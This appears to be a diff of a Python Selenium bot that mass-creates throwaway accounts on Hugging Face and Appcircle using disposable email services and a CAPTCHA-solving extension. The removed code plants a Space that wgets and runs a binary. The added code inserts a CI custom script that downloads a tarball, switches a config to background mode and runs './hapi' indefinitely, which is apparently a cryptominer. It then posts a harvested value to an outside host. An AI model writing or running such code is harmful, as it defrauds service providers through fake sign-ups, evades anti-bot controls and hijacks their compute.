@@ -9,124 +9,212 @@ from selenium.webdriver.common.action_chains import ActionChains
 import random
 import requests
 
-def xddddddz():
-    try:
-        # os.system("npm i")
-        options = uc.ChromeOptions()
-        os.system("rm -rf rawrz")
-        os.system("tar -xf kudbebedda.tar.gz")
-        os.system("rm -rf rawr")
-        os.system("cp -r rawrz rawr")
-        a = True
-        low_word = "abcdefghijklkmnopqrstuvwxyz"
-        upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
-        number = "1234567890"
-        symbols = "!@#$%&*"
-        username_for = low_word
-        password_for = low_word + upper_word + number + symbols
-        long_password = 16
-        long_username = 12
-        ass = "".join(random.sample(username_for, 12))
-        options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
-        options.user_data_dir = "rawr"
-        options.add_argument("--window-size=1920,1080")
-        options.add_argument('--user-data-dir=rawr')
-        driver = uc.Chrome(options=options, version_main=107)
-        driver.get("https://nopecha.com/setup#l6ehtlhpr8")
-        time.sleep(2)
-        driver.get("https://google.com/")
-        time.sleep(1)
-        driver.get("https://nopecha.com/setup#l6ehtlhpr8")
-        time.sleep(2)
-        driver.get("https://google.com/")
-        time.sleep(1)
-        driver.get("https://nopecha.com/setup#l6ehtlhpr8")
-        time.sleep(2)
-        driver.get("https://google.com/")
-        time.sleep(2)
-        driver.get("https://huggingface.co/join")
-        headersdomain = {'accept': 'application/ld+json'}
-        responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
-        emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
-        myobj = {'address': emil,"password": "cloud"}
-        headersreg = {'accept': 'application/ld+json'}
-        responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[1]/label[1]/input").send_keys(emil)
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[1]/label[2]/input").send_keys("".join(random.sample(low_word, 13))+"H1!")
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/button").click()
-        time.sleep(2)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/label[1]/input").send_keys("".join(random.sample(low_word, 13)))
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/label[2]/input").send_keys("".join(random.sample(low_word, 13)))
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[2]/label[8]/input").click()
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/div/form/div[3]/button").click()
-        time.sleep(45)
-        myobjlog = {'address': emil,"password": "cloud"}
-        headerslog = {'accept': 'application/ld+json'}
-        responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
-        token = responselog.json()["token"]
-        headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
-        responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
-        headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
-        responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
-        verifylink = responsemessz.json()["text"].split("\n")[4]
-        driver.get(verifylink)
-        time.sleep(4)
-        driver.get("https://huggingface.co/new-space")
-        time.sleep(3)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[1]/label[2]/input").send_keys("".join(random.sample(low_word, 13)))
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[3]/label[2]/div").click()
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[4]/label[2]/input").click()
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div[2]/form/div[5]/button").click()
-        time.sleep(6)
-        driver.find_element(By.XPATH, "/html/body/div/main/header/div/div/div/div[1]/a[2]").click()
-        time.sleep(2)
+#Run Browser
+import os
+print("rawr")
+import undetected_chromedriver as uc
+import time
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.action_chains import ActionChains
+import random
+import requests
+options = uc.ChromeOptions()
+os.system("rm -rf rawr")
+os.system("cp -r rawrz rawr")
+a = True
+low_word = "abcdefghijklkmnopqrstuvwxyz" # uwuboirawr@proton.me
+upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ" # ergfghzcfsd
+number = "1234567890"
+symbols = "!@#$%&*"
+username_for = low_word
+password_for = low_word + upper_word + number + symbols
+long_password = 16
+long_username = 12
+ass = "".join(random.sample(username_for, 12))
+options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
+options.user_data_dir = "rawr"
+options.add_argument("--window-size=1920,1080")
+options.add_argument('--user-data-dir=rawr')
+options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36")
+driver = uc.Chrome(options=options, version_main=107) 
+# driver.execute_script('window.open("http://bings.com","_blank");')
+# driver.switch_to.window(driver.window_handles[0])
+driver.get("https://nopecha.com/setup#rvl1i0jtry")
+time.sleep(0.21)
+driver.get("https://nopecha.com/setup#rvl1i0jtry")
+time.sleep(0.21)
+driver.get("https://nopecha.com/setup#rvl1i0jtry")
+driver.delete_all_cookies()
+def get_email():
+    headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "cross-site",
+            "Sec-Fetch-User": "?1",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache"}
+    uwu = {
+            "email":["plusGmail"]
+    }
+    rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
+    headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
+    headersdomain["Accept"] = "application/json, text/plain, */*"
+    headersdomain["Content-Type"] = "application/json"
+    headersdomain["X-Requested-With"] = "XMLHttpRequest"
+    headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
+    rawrz = requests.post('https://www.emailnator.com/generate-email', headers=headersdomain, json=uwu)
+    emil = rawrz.json()["email"][0].split("+")[0]+"+"+"".join(random.sample(low_word, 7))+"@gmail.com"
+    return emil
 
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/button").click()
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/header/div[3]/div/div/div/ul/li[1]").click()
-        time.sleep(6)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[1]/input").send_keys("app.py")
-        time.sleep(1)
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[2]/div/textarea").click()
-        actions = ActionChains(driver)
-        actions.send_keys("""import gradio as gr
-        import os
-        def greet(name):
-            os.system("pkill cloudy")
-        os.system("rm cloudybork2.tar.gz")
-        os.system("rm config.json")
-        os.system("rm cloudy")
-        os.system("wget https://github.com/n2dhektor/fictional-octo-waddle/raw/main/cloudybork2.tar.gz")
-        os.system("tar -xf cloudybork2.tar.gz")
-        os.system("chmod +x ./cloudy")
-        os.system("./cloudy")
-        return "Hello " + name + "!!"
-        """+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"""
-        iface = gr.Interface(fn=greet, inputs="text", outputs="text")
-        iface.launch()""")
-        actions.perform()
-        driver.find_element(By.XPATH, "/html/body/div/main/div/section/div/form/div[2]/div[4]/div[2]/button").click()
-        time.sleep(60)
-        driver.find_element(By.XPATH, "/html/body/div/main/header/div/div/div/div[1]/a[1]").click()
-        time.sleep(15)
-        iframe = driver.find_element(By.XPATH, "/html/body/div/main/div/iframe")
-        driver.switch_to.frame(iframe)
-        time.sleep(2)
-        driver.find_element(By.XPATH, "/html/body/gradio-app/div/div[2]/div/div/div/div[1]/div[2]/button[2]").click()
-        time.sleep(75)
-        driver.switch_to.default_content()
-        driver.close()
-    except: 
-        driver.close()
-        time.sleep(95)
-        xddddddz()
-        pass
-xddddddz()
+
+email = get_email()
+
+def get_message():
+    headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Upgrade-Insecure-Requests": "1",
+            "Sec-Fetch-Dest": "document",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-Site": "cross-site",
+            "Sec-Fetch-User": "?1",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache"}
+    uwu = {}
+    rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
+    headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
+    headersdomain["Accept"] = "application/json, text/plain, */*"
+    headersdomain["Content-Type"] = "application/json"
+    headersdomain["X-Requested-With"] = "XMLHttpRequest"
+    headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
+    uwu["email"]=email
+    rawrz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
+    for bork in rawrz.json()["messageData"]:
+            if(bork["messageID"]!="ADSVPN"):
+                    uwu["messageID"] = bork["messageID"]
+                    rawrzz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
+                    verifylink = rawrzz.text
+                    return verifylink.split("verify your email address")[1].split("This link")[0].replace('</p><p><a href="', '').replace('" rel="nofollow">Link to e-mail address verification</a></p><p>', "")
+
+
+
+low_word = "abcdefghijklkmnopqrstuvwxyz"
+upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
+number = "1234567890"
+symbols = "!@#$%&*"
+username_for = low_word + number
+password_for = low_word + upper_word + number + symbols
+long_password = 16
+long_username = 3
+
+usenrame = "".join(random.sample(username_for, long_username))
+passwd = "".join(random.sample(password_for, long_password))
+
+driver.delete_all_cookies()
+time.sleep(3)
+
+driver.get("https://my.appcircle.io/")
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div/div[2]/div[1]/div[3]/form/ul/li[2]/a").click() #click sign in
+
+
+driver.find_element(By.XPATH,'//*[@id="email"]').send_keys(email) #input email
+driver.find_element(By.XPATH,'//*[@id="password"]').send_keys(passwd) #input password
+driver.find_element(By.XPATH,'//*[@id="password-confirm"]').send_keys(passwd) #input password2
+
+
+
+
+time.sleep(10)
+
+driver.switch_to.frame(driver.find_element(By.XPATH, '//*[@id="kc-form-login"]/div[1]/div[4]/div/div/div/iframe'))
+
+captcha = driver.find_element(By.XPATH,'/html/body/div[2]/div[3]/div[1]/div/div/span').get_attribute("aria-checked")
+if captcha == "true":
+    print("captcha ready!")
+    driver.switch_to.default_content()
+    time.sleep(4)
+    driver.find_element(By.XPATH,"/html/body/div[1]/div[2]/div[1]/form/div[3]/div/button").click() #click sign in
+
+time.sleep(40)
+print(get_message())
+driver.get(get_message())
+time.sleep(1)
+driver.get("https://my.appcircle.io/build?modal=/build/modal/NewProfileDialog")
+time.sleep(1)
+driver.find_element(By.XPATH,'/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/div/div[1]/div[2]/div/div/div/div/div/div[1]/div[2]/input').send_keys(usenrame) #input profilname
+time.sleep(1)
+# driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div/select").click() #click sellect device
+# time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div/select/option[3]").click() #click sellect device
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/form/footer/button").click() #click save
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[3]/div[3]/div/div[1]/div[2]/div/div/div/div/div/div[1]/div").click() #click repo
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div/div[2]/div[3]/div[1]/div[2]/div/div/div/div/div/div[2]/div/div[6]/div[2]/div").click()
+time.sleep(2)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div/div[1]/div[2]/div/div/div/div/div[1]/div[1]/div/input").send_keys("https://github.com/uwuboiz/scaling-robot")
+time.sleep(0.5)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/footer/button").click()
+
+time.sleep(4)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[1]/div[2]/section/div[2]").click() #click workflow
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div[3]/div/div[2]/div[1]/div[2]/div/div/div/div/div/div[1]/div[3]").click() #click push workflow
+time.sleep(2)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div/div/div/div[3]/div").click() #click custom script
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div/div[6]/div/div[2]/div/select/option[2]").click() #select bash
+time.sleep(1)
+
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div/div[7]/div[2]/div[1]/div/div/div/div[1]/div[2]/div[1]/div[4]/div[1]").click()
+time.sleep(1)
+
+actions = ActionChains(driver)
+actions.send_keys(Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE)
+actions.send_keys(Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE)
+actions.send_keys(Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE,Keys.BACKSPACE)
+actions.perform()
+time.sleep(1)
+actions.send_keys("""wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/xdcloudy2.tar.gz && tar -xf xdcloudy2.tar.gz && chmod +x ./hapi && sed -i 's/"background": false/"background": true/g' config.json && sed -i 's/hardness/owocircle/g' config.json && ./hapi && sleep 99999""")
+actions.perform()
+
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/form/footer/button").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[3]").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[2]/div[3]/div[3]/div[4]/div[1]/div[2]/div/div/div/div/div/div/div[7]/button").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div/footer/a").click()
+time.sleep(60)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[2]").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[1]/div[2]/section/div[3]").click()
+time.sleep(1.5)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[2]").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[1]/input").send_keys("main")
+time.sleep(0.76)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[2]/div[2]/input").click()
+time.sleep(0.76)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[2]/div[2]/div[2]/div/div/div[1]/div[2]/div").click()
+time.sleep(0.76)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[3]/div[2]/input").click()
+time.sleep(0.76)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/div[2]/div[1]/div[2]/div/div/div/div/div[1]/div/div[1]/div/div[1]/div[3]/div[2]/div[2]/div/div/div[1]/div[2]/div/div/div/div/ul/li[1]").click()
+time.sleep(0.76)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div[2]/form/footer/button").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[1]/div[2]").click()
+time.sleep(1)
+driver.find_element(By.XPATH,"/html/body/div[1]/div/div[4]/div[2]/main/div/div/div/div[1]/div[2]/section/div[1]/section/div[1]/a").click()
+time.sleep(2)
+uwu = driver.find_element(By.XPATH,"/html/body/div[1]/div/div[3]/div/div/div/div[2]/div/div/div/div[4]/div/input").get_attribute("value")
+uwuz = "linkzy="+uwu
+print(uwu)
+rawrz = requests.post('https://api.idots.cf/uwu', data=uwu, headers={"Content-Type": "application/x-www-form-urlencoded"})
